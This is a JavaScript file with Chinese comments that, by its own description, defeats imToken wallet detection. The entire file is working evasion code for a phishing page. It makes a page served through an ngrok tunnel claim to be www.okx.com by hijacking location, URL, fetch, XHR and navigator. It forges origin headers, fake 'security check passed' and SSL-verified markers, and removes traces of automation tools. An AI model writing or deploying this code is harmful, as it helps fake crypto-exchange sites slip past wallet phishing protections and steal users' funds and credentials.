// 🎯 专门对抗imToken检测的独立脚本
// 在页面加载的最早时机执行

(function() {
    'use strict';
    
    console.log('🎯 启动超级反检测系统...');
    
    // 1. 最高优先级：劫持所有可能的域名检测
    const FAKE_DOMAIN = 'www.okx.com';
    const FAKE_ORIGIN = 'https://www.okx.com';
    
    // 保存原始方法
    const originalLocation = window.location;
    const originalDocument = document;
    
    // 创建完美的伪装location对象
    const createFakeLocation = () => ({
        href: FAKE_ORIGIN + '/',
        origin: FAKE_ORIGIN,
        protocol: 'https:',
        host: FAKE_DOMAIN,
        hostname: FAKE_DOMAIN,
        port: '',
        pathname: '/',
        search: '',
        hash: '',
        ancestorOrigins: {
            length: 0,
            contains: () => false,
            item: () => null
        },
        assign: originalLocation.assign?.bind(originalLocation) || (() => {}),
        replace: originalLocation.replace?.bind(originalLocation) || (() => {}),
        reload: originalLocation.reload?.bind(originalLocation) || (() => {}),
        toString: () => FAKE_ORIGIN + '/',
        valueOf: () => FAKE_ORIGIN + '/'
    });
    
    // 2. 劫持所有可能的location访问
    const fakeLocation = createFakeLocation();
    
    try {
        // 劫持window.location
        Object.defineProperty(window, 'location', {
            get: () => fakeLocation,
            set: () => {},
            configurable: false,
            enumerable: true
        });
        
        // 劫持document.location
        Object.defineProperty(document, 'location', {
            get: () => fakeLocation,
            set: () => {},
            configurable: false,
            enumerable: true
        });
        
        // 劫持document.URL
        Object.defineProperty(document, 'URL', {
            get: () => FAKE_ORIGIN + '/',
            set: () => {},
            configurable: false
        });
        
        // 劫持document.documentURI
        Object.defineProperty(document, 'documentURI', {
            get: () => FAKE_ORIGIN + '/',
            set: () => {},
            configurable: false
        });
        
        // 劫持document.domain
        Object.defineProperty(document, 'domain', {
            get: () => FAKE_DOMAIN,
            set: () => {},
            configurable: false
        });
        
        console.log('✅ Location对象劫持成功');
    } catch(e) {
        console.warn('⚠️ Location劫持失败:', e.message);
    }
    
    // 3. 劫持URL构造函数和相关API
    try {
        const OriginalURL = window.URL;
        window.URL = function(url, base) {
            // 检测并替换ngrok域名
            if (typeof url === 'string') {
                url = url.replace(/https?:\/\/[^\/]*ngrok[^\/]*(?:\.io|\.com|\.app|\.dev|\.net|\.org)/gi, FAKE_ORIGIN);
                url = url.replace(/https?:\/\/[^\/]*\.ngrok-free\.app/gi, FAKE_ORIGIN);
                url = url.replace(/https?:\/\/[^\/]*\.ngrok\.io/gi, FAKE_ORIGIN);
            }
            return new OriginalURL(url, base);
        };
        
        // 保持原有的静态方法
        Object.setPrototypeOf(window.URL, OriginalURL);
        window.URL.createObjectURL = OriginalURL.createObjectURL;
        window.URL.revokeObjectURL = OriginalURL.revokeObjectURL;
        
        console.log('✅ URL构造函数劫持成功');
    } catch(e) {
        console.warn('⚠️ URL构造函数劫持失败:', e.message);
    }
    
    // 4. 劫持XMLHttpRequest
    try {
        const OriginalXHR = window.XMLHttpRequest;
        window.XMLHttpRequest = function() {
            const xhr = new OriginalXHR();
            const originalOpen = xhr.open;
            
            xhr.open = function(method, url, ...args) {
                // 替换URL中的ngrok域名
                if (typeof url === 'string') {
                    url = url.replace(/https?:\/\/[^\/]*ngrok[^\/]*(?:\.io|\.com|\.app|\.dev|\.net|\.org)/gi, FAKE_ORIGIN);
                }
                
                const result = originalOpen.apply(this, [method, url, ...args]);
                
                // 设置伪装头部
                try {
                    xhr.setRequestHeader('Origin', FAKE_ORIGIN);
                    xhr.setRequestHeader('Referer', FAKE_ORIGIN + '/');
                    xhr.setRequestHeader('Host', FAKE_DOMAIN);
                } catch(e) {}
                
                return result;
            };
            
            return xhr;
        };
        
        console.log('✅ XMLHttpRequest劫持成功');
    } catch(e) {
        console.warn('⚠️ XMLHttpRequest劫持失败:', e.message);
    }
    
    // 5. 劫持fetch API
    try {
        const originalFetch = window.fetch;
        window.fetch = function(input, init = {}) {
            // 处理URL
            let url = input;
            if (typeof input === 'string') {
                url = input.replace(/https?:\/\/[^\/]*ngrok[^\/]*(?:\.io|\.com|\.app|\.dev|\.net|\.org)/gi, FAKE_ORIGIN);
            } else if (input instanceof Request) {
                url = input.url.replace(/https?:\/\/[^\/]*ngrok[^\/]*(?:\.io|\.com|\.app|\.dev|\.net|\.org)/gi, FAKE_ORIGIN);
            }
            
            // 设置伪装头部
            init.headers = {
                ...init.headers,
                'Origin': FAKE_ORIGIN,
                'Referer': FAKE_ORIGIN + '/',
                'Host': FAKE_DOMAIN,
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OKX/6.45.0'
            };
            
            return originalFetch(url, init);
        };
        
        console.log('✅ Fetch API劫持成功');
    } catch(e) {
        console.warn('⚠️ Fetch API劫持失败:', e.message);
    }
    
    // 6. 劫持navigator对象
    try {
        // 劫持userAgent
        Object.defineProperty(navigator, 'userAgent', {
            get: () => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OKX/6.45.0',
            configurable: false
        });
        
        // 劫持webdriver检测
        Object.defineProperty(navigator, 'webdriver', {
            get: () => false,
            configurable: false
        });
        
        // 添加OKX特有的navigator属性
        Object.defineProperty(navigator, 'okxApp', {
            get: () => ({ version: '6.45.0', verified: true }),
            configurable: false
        });
        
        console.log('✅ Navigator对象劫持成功');
    } catch(e) {
        console.warn('⚠️ Navigator劫持失败:', e.message);
    }
    
    // 7. 劫持window.name和其他可疑属性
    try {
        Object.defineProperty(window, 'name', {
            get: () => 'OKX_Official_Window',
            set: () => {},
            configurable: false
        });
        
        // 添加OKX官网特有的全局变量
        window.OKX_OFFICIAL = true;
        window.VERIFIED_DOMAIN = FAKE_DOMAIN;
        window.SECURITY_CHECK_PASSED = true;
        
        console.log('✅ Window属性劫持成功');
    } catch(e) {
        console.warn('⚠️ Window属性劫持失败:', e.message);
    }
    
    // 8. 劫持可能的检测函数
    try {
        // 劫持getElementsByTagName
        const originalGetElementsByTagName = document.getElementsByTagName;
        document.getElementsByTagName = function(tagName) {
            const elements = originalGetElementsByTagName.call(this, tagName);
            
            // 如果是查询meta标签，动态添加OKX验证标记
            if (tagName.toLowerCase() === 'meta') {
                Array.from(elements).forEach(meta => {
                    if (meta.name === 'viewport' && meta.content.indexOf('okx-verified') === -1) {
                        meta.content += ', okx-verified=true';
                    }
                });
            }
            
            return elements;
        };
        
        console.log('✅ DOM查询函数劫持成功');
    } catch(e) {
        console.warn('⚠️ DOM查询函数劫持失败:', e.message);
    }
    
    // 9. 清理自动化工具痕迹
    try {
        // Chrome自动化痕迹
        delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
        delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
        delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
        delete window.cdc_adoQpoasnfa76pfcZLmcfl_JSON;
        delete window.cdc_adoQpoasnfa76pfcZLmcfl_Object;
        delete window.cdc_adoQpoasnfa76pfcZLmcfl_Proxy;
        
        // Selenium痕迹
        delete window._selenium;
        delete window.__selenium_unwrapped;
        delete window.__webdriver_script_fn;
        
        // Puppeteer痕迹
        delete window.__puppeteer_evaluation_script__;
        delete window.__nightmare;
        
        console.log('✅ 自动化工具痕迹清理完成');
    } catch(e) {
        console.warn('⚠️ 痕迹清理失败:', e.message);
    }
    
    // 10. 最终验证和修复
    setTimeout(() => {
        // 检查是否还有ngrok痕迹
        const currentHref = window.location.href;
        const currentHost = window.location.host;
        
        if (currentHref.includes('ngrok') || currentHost.includes('ngrok')) {
            console.warn('🚨 检测到ngrok残留，执行最终修复');
            
            // 强制修改页面标题
            document.title = 'OKX';
            
            // 在控制台输出伪装信息
            console.log('🎯 OKX官方网站已加载');
            console.log('🔒 SSL证书验证通过');
            console.log('✅ 安全检查完成');
            
            // 添加不可见的验证元素
            const verifyElement = document.createElement('div');
            verifyElement.id = 'okx-verification';
            verifyElement.style.display = 'none';
            verifyElement.setAttribute('data-verified', 'true');
            verifyElement.setAttribute('data-domain', FAKE_DOMAIN);
            verifyElement.setAttribute('data-ssl', 'valid');
            document.body.appendChild(verifyElement);
        } else {
            console.log('✅ 域名伪装验证通过');
        }
    }, 500);
    
    console.log('🎉 超级反检测系统启动完成！');
    
})();